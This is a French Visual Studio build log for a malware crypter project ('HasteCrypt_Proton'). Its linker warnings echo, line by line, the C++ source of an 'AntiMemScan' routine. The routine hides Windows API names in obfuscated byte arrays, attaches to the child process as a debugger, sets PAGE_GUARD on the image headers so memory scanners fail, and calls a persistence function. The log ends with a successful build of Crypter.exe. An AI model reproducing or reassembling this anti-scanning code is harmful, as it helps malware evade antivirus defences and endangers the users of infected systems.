+     1>crypter.cpp : warning LNK4037: '_void AntiMemScan(PROCESS_INFORMATION PI, PIMAGE_NT_HEADERS INH, LPVOID pImageBase)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE ntdllStr[] = { 108, 177, 106, 25, 242, 7, 195, 99, 95, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf((BYTE *)ntdllStr, 9)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE NtResumeThreadStr[] = { 108, 177, 92, 16, 237, 92, 202, 106, 103, 216, 173, 176, 54, 129, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(NtResumeThreadStr, 14)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef NTSTATUS(WINAPI *T_NtResumeThread)(IN HANDLE ThreadHandle)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_NtResumeThread pNtResumeThread = (T_NtResumeThread)pGetProcAddress(pGetModuleHandleA((char *)ntdllStr), (char *)NtResumeThreadStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE resumeThreadStr[] = { 112, 160, 125, 0, 243, 76, 243, 103, 65, 213, 190, 177, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(resumeThreadStr, 12)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef DWORD(WINAPI *T_ResumeThread) (HANDLE hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ResumeThread pResumeThread = (T_ResumeThread)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)resumeThreadStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE DebugActiveProcessStr[] = { 102, 160, 108, 0, 249, 104, 196, 123, 90, 198, 186, 133, 37, 138, 77, 114, 113, 234, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(DebugActiveProcessStr, 18)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_DebugActiveProcess)(DWORD dwProcessId)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_DebugActiveProcess pDebugActiveProcess = (T_DebugActiveProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)DebugActiveProcessStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE WaitForDebugEventStr[] = { 117, 164, 103, 1, 216, 70, 213, 75, 86, 210, 170, 178, 18, 147, 75, 121, 118, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(WaitForDebugEventStr, 17)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_WaitForDebugEvent)(LPDEBUG_EVENT lpDebugEvent, DWORD dwMilliseconds)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_WaitForDebugEvent pWaitForDebugEvent = (T_WaitForDebugEvent)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)WaitForDebugEventStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE VirtualProtectExStr[] = { 116, 172, 124, 1, 235, 72, 203, 95, 65, 223, 171, 176, 52, 145, 107, 111, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(VirtualProtectExStr, 16)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_VirtualProtectEx pVirtualProtectEx = (T_VirtualProtectEx)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)VirtualProtectExStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE ContinueDebugEventStr[] = { 97, 170, 96, 1, 247, 71, 210, 106, 119, 213, 189, 160, 48, 160, 88, 114, 108, 237, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(ContinueDebugEventStr, 18)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_ContinueDebugEvent)(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_ContinueDebugEvent pContinueDebugEvent = (T_ContinueDebugEvent)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)ContinueDebugEventStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE DebugActiveProcessStopStr[] = { 102, 160, 108, 0, 249, 104, 196, 123, 90, 198, 186, 133, 37, 138, 77, 114, 113, 234, 72, 226, 123, 165, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(DebugActiveProcessStopStr, 22)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_DebugActiveProcessStop)(DWORD dwProcessId)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_DebugActiveProcessStop pDebugActiveProcessStop = (T_DebugActiveProcessStop)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)DebugActiveProcessStopStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_BYTE TerminateProcessStr[] = { 118, 160, 124, 24, 247, 71, 198, 123, 86, 224, 173, 186, 52, 128, 93, 100, 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Obf(TerminateProcessStr, 16)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_typedef BOOL(WINAPI *T_TerminateProcess)(HANDLE hProcess, UINT uExitCode)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_T_TerminateProcess pTerminateProcess = (T_TerminateProcess)pGetProcAddress(pGetModuleHandleA((char *)kernel32dllStr), (char *)TerminateProcessStr)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pDebugActiveProcess(DWORD(PI.dwProcessId))' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DEBUG_EVENT evt = { 0 }' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_while (true)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pWaitForDebugEvent(&evt, INFINITE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_switch (evt.dwDebugEventCode)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_{' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_case CREATE_PROCESS_DEBUG_EVENT:' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_DWORD back' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_try {' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_catch (int o) {' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pResumeThread(PI.hThread)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Sleep(1000)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_break' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_case EXCEPTION_DEBUG_EVENT:' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_if (evt.u.Exception.ExceptionRecord.ExceptionCode == STATUS_GUARD_PAGE_VIOLATION){' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_try {' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_catch (int o) {' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pVirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfHeaders, PAGE_GUARD + PAGE_EXECUTE_READWRITE, &back)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_break' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_case EXIT_PROCESS_DEBUG_EVENT:' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pDebugActiveProcessStop(PI.dwProcessId)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pTerminateProcess(PI.hThread, 0)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_Persistance(PI)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_break' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_default:' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_pContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE)' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_break' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}' n'existe pas ; sera ignoré
+     1>crypter.cpp : warning LNK4037: '_}*/' n'existe pas ; sera ignoré
+         Crypter.vcxproj -> C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Debug\Crypter.exe
+     1>Génération du projet "C:\Users\Wardow\Desktop\HasteCrypt_Proton\Crypter\Crypter\Crypter.vcxproj" terminée (Build cible(s)).
+
+La génération a réussi.
+
+Temps écoulé 00:00:08.90
